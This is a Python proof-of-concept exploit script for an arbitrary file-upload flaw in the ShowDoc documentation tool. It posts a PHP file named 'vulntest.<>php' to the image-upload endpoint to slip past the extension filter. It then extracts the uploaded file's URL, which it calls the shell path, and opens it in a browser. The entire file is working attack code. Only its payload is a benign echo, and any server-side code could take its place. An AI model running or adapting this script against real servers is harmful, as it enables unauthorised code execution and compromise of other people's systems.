import requests
import re
import sys
import webbrowser
import  time

def startVulnFile(filepath):
    chrome = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
    webbrowser.register("chrome", None, webbrowser.BackgroundBrowser(chrome))
    webbrowser.get("chrome").open(filepath)



def upload(site):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=--------------------------835846770881083140190633'
        }
    url = site + "/index.php?s=/home/page/uploadImg"
    data = '----------------------------835846770881083140190633\n'\
                        'Content-Disposition: form-data; name="editormd-image-file"; filename="vulntest.<>php"\n'\
                        'Content-Type: text/plain\n'\
                        '\n'\
                        '<?php echo "vulntest"?>\n'\
                        '----------------------------835846770881083140190633--'

       
    req = requests.post(url, headers=headers, data=data,verify=False, timeout=20)
    print(req.text)
    file_path = re.search(r'(http){1}.*(\.php){1}', req.text) 
    if (('"success":1' in req.text) and file_path):
        file_path = file_path.group()                                     # * 提取返回的文件路径
        file_path = file_path.replace('\\', '')  
    shellpath = file_path
    print('[+] 上传成功！ 请查看响应包内容！',  shellpath)
    time.sleep(1)
    startVulnFile(shellpath)
    
        
if __name__=="__main__":
    url = sys.argv[1]
    print("python3 script/showdoc_upload.py " + url)
    upload(url)
